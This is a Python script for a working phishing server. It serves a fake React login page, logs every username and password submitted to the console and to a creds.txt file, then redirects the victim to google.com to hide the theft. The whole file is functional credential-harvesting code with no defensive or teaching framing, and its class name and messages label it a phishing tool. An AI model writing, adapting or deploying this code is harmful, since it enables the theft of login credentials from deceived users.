from http.server import BaseHTTPRequestHandler, HTTPServer
import json

PHISHING_HTML = """
<!DOCTYPE html>
<html>
  <head>
    <title>Login</title>
    <link rel="icon" src="null" />    
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <script src="https://unpkg.com/react@18/umd/react.development.js"></script>
    <script src="https://unpkg.com/react-dom@18/umd/react-dom.development.js"></script>
    <script src="https://unpkg.com/@babel/standalone/babel.min.js"></script>
  </head>
  <body>
    <div id="root"></div>
    <script type="text/babel">
      function App() {
        const [user, setUser] = React.useState("");
        const [pass, setPass] = React.useState("");

        const submit = async (e) => {
          e.preventDefault();
          const data = { user, pass };
          try {
            await fetch("/", {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify(data)
            });
          } catch (err) {
            console.log("Send failed:", err);
          }
          // optionally redirect to the original page
          window.location.href = "https://google.com";
        };

        return (
          <form onSubmit={submit} style={{ margin: "2rem", textAlign: "center" }}>
            <h2>Login</h2>
            <input
              placeholder="Username"
              onChange={(e) => setUser(e.target.value)}
              style={{ marginBottom: "1rem", padding: "0.5rem" }}
            /><br />
            <input
              type="password"
              placeholder="Password"
              onChange={(e) => setPass(e.target.value)}
              style={{ marginBottom: "1rem", padding: "0.5rem" }}
            /><br />
            <button type="submit">Log In</button>
          </form>
        );
      }

      const root = ReactDOM.createRoot(document.getElementById("root"));
      root.render(<App />);
    </script>
  </body>
</html>
"""

# === HTTP handler ===
class PhishingHandler(BaseHTTPRequestHandler):
    def _set_headers(self, status=200, content_type="text/html"):
        self.send_response(status)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Methods", "POST, OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "Content-Type")
        self.send_header("Content-Type", content_type)
        self.end_headers()

    def do_OPTIONS(self):
        self._set_headers()

    def do_GET(self):
        if self.path == "/":
            self._set_headers()
            self.wfile.write(PHISHING_HTML.encode())
        else:
            self.send_error(404)

    def do_POST(self):     
      length = int(self.headers.get("Content-Length", 0))
      body = self.rfile.read(length)


      try:
          data = json.loads(body.decode())
      except json.JSONDecodeError:
          data = {"raw": body.decode(errors="replace")}

      print(f"[+] Captured: {data} from ", {self.client_address})

      try:
          with open("creds.txt", "a") as f:
              f.write(json.dumps(data) + "\n")
      except Exception as e:
          print(f"[!] Error writing to file: {e}")

      self.send_response(200)
      self.send_header("Access-Control-Allow-Origin", "*")
      self.send_header("Content-Type", "application/json")
      self.end_headers()
      self.wfile.write(json.dumps({"status": "ok"}).encode())


# === Start server ===
if __name__ == "__main__":
    port = 8080
    print(f"[*] Serving phishing page and capturing credentials on http://0.0.0.0:{port}")
    server = HTTPServer(("0.0.0.0", port), PhishingHandler)
    server.serve_forever()
